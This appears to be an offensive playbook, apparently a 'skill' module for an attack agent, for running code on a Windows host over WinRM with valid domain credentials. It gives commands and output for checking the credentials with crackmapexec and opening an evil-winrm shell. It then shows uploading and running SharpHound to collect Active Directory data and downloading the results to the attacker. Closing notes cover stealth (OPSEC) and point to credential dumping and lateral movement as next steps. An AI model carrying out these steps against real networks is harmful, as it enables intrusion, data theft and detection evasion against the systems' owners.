# WinRM Remote Execution

## Scenario
Valid domain credentials, WinRM (5985) open on target.

## Step 1: Verify WinRM Access
```bash
$ crackmapexec winrm 10.10.10.80 -u admin -p 'Adm1nP@ss2024!' -d MEGACORP.LOCAL
WINRM  10.10.10.80  5985  WEB01  [+] MEGACORP.LOCAL\admin:Adm1nP@ss2024! (Pwn3d!)
```

## Step 2: Connect with Evil-WinRM
```bash
$ evil-winrm -i 10.10.10.80 -u admin -p 'Adm1nP@ss2024!'

Evil-WinRM shell v3.5

*Evil-WinRM* PS C:\Users\admin\Documents> whoami
megacorp\admin

*Evil-WinRM* PS C:\Users\admin\Documents> hostname
WEB01

*Evil-WinRM* PS C:\Users\admin\Documents> ipconfig

Windows IP Configuration
Ethernet adapter Ethernet0:
   IPv4 Address. . . . . . . . . . . : 10.10.10.80
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
```

## Step 3: Upload Tools
```bash
*Evil-WinRM* PS C:\Users\admin\Documents> upload /opt/tools/SharpHound.exe C:\Windows\Temp\sh.exe
Info: Uploading /opt/tools/SharpHound.exe to C:\Windows\Temp\sh.exe
Data: 1234568 bytes of 1234568 bytes copied
Info: Upload successful!

*Evil-WinRM* PS C:\Users\admin\Documents> C:\Windows\Temp\sh.exe -c All --zipfilename bh.zip
```

## Step 4: Download Results
```bash
*Evil-WinRM* PS C:\Users\admin\Documents> download C:\Windows\Temp\bh.zip /tmp/bloodhound_web01.zip
Info: Downloading C:\Windows\Temp\bh.zip to /tmp/bloodhound_web01.zip
Info: Download successful!
```

## OPSEC
- WinRM uses encrypted HTTP (port 5985) — stealthier than PsExec
- Event 4624 type 3 logged on target
- No service creation, no binary upload via SMB
- Consider: `Enter-PSSession` from Windows for native PowerShell remoting

## Next Steps
→ **discovery skill**: Run BloodHound data in Neo4j, find DA paths
→ **credential_access skill**: Dump credentials from WEB01
→ **lateral_movement skill**: Pivot to other hosts with found credentials
